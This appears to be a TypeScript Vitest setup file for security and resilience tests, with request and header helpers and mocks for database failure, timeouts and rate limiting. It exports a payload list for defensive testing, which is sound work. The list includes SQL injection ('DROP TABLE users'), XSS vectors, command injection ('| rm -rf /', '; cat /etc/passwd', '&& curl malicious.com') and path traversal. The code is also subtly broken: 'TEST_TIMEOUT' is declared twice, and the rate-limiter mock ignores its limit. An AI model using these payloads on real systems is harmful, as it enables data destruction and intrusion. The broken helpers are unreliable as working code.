/**
 * Security and Failure Tests Setup
 * 
 * This file configures the test environment for security and failure testing.
 * It sets up global mocks, test utilities, and configuration for running
 * security and resilience tests.
 */

import { vi, beforeEach, afterEach, afterAll } from 'vitest';

// Increase test timeout for failure scenarios that involve timeouts
const TEST_TIMEOUT = 30000; // 30 seconds

// Set up global test configuration
beforeEach(() => {
  // Reset all mocks before each test
  vi.clearAllMocks();
  
  // Reset timers for timeout tests
  vi.useFakeTimers();
});

afterEach(() => {
  // Restore real timers
  vi.useRealTimers();
  
  // Clear any pending timers
  vi.clearAllTimers();
});

afterAll(() => {
  // Restore all mocks
  vi.restoreAllMocks();
});

// Global test configuration
// Note: Timeout configuration is done in vitest.config.ts for global settings
// For individual test timeouts, use the third parameter of it/test functions

// Increase test timeout for failure scenarios that involve timeouts
const TEST_TIMEOUT = 30000; // 30 seconds

// Mock configuration for different environments
const testEnv = {
  NODE_ENV: 'test',
  DATABASE_URL: 'file:./test-db.sqlite',
  NEXTAUTH_SECRET: 'test-secret-key-for-testing-only',
  NEXTAUTH_URL: 'http://localhost:3000',
};

// Apply test environment
Object.entries(testEnv).forEach(([key, value]) => {
  process.env[key] = value;
});

// Helper functions for security tests

/**
 * Creates a mock request with security headers for testing
 */
export function createSecurityTestRequest(options: {
  method?: string;
  headers?: Record<string, string>;
  body?: Record<string, unknown>;
  cookies?: Record<string, string>;
} = {}) {
  const defaultHeaders = {
    'Content-Type': 'application/json',
    'User-Agent': 'security-test-agent',
    'X-Request-ID': `test-${Date.now()}`,
  };

  return {
    method: options.method || 'GET',
    headers: { ...defaultHeaders, ...options.headers },
    body: options.body,
    cookies: options.cookies || {},
  };
}

/**
 * Creates various malicious payloads for security testing
 */
export const maliciousPayloads = {
  sqlInjection: [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "1; DELETE FROM payments",
    "admin'--",
    "UNION SELECT * FROM users",
  ],
  
  xss: [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg/onload=alert(1)>',
    'javascript:alert(1)',
    '{{constructor.constructor("alert(1)")()}}',
  ],
  
  commandInjection: [
    '; cat /etc/passwd',
    '| rm -rf /',
    '&& curl malicious.com',
    '$(touch malicious)',
  ],
  
  pathTraversal: [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32',
    '%2e%2e/etc/passwd',
  ],
};

/**
 * Validates that security headers are present
 */
export function validateSecurityHeaders(headers: Headers) {
  const requiredHeaders = [
    'X-Content-Type-Options',
    'X-Frame-Options',
    'X-XSS-Protection',
  ];
  
  return requiredHeaders.every(header => headers.has(header));
}

/**
 * Creates a mock for database connection failure
 */
export function mockDatabaseFailure(errorCode: string = 'P1001') {
  return vi.fn().mockRejectedValue(
    new Error(`${errorCode}: Database connection error`)
  );
}

/**
 * Creates a mock for external service timeout
 */
export function mockExternalServiceTimeout(delayMs: number = 30000) {
  return vi.fn().mockImplementation(
    () => new Promise((_, reject) =>
      setTimeout(() => reject(new Error('Service timeout')), delayMs)
    )
  );
}

/**
 * Creates a mock for rate limiting
 */
export function createRateLimiterMock(limit: number, windowMs: number) {
  const requests = new Map<string, number>();
  
  return vi.fn().mockImplementation((key: string) => {
    const now = Date.now();
    const record = requests.get(key);
    
    if (!record || now > record) {
      requests.set(key, now + windowMs);
      return { allowed: true, remaining: limit - 1 };
    }
    
    return { allowed: false, remaining: 0, retryAfter: 60 };
  });
}

// Export test utilities
export const testUtils = {
  maliciousPayloads,
  createSecurityTestRequest,
  validateSecurityHeaders,
  mockDatabaseFailure,
  mockExternalServiceTimeout,
  createRateLimiterMock,
  TEST_TIMEOUT,
};
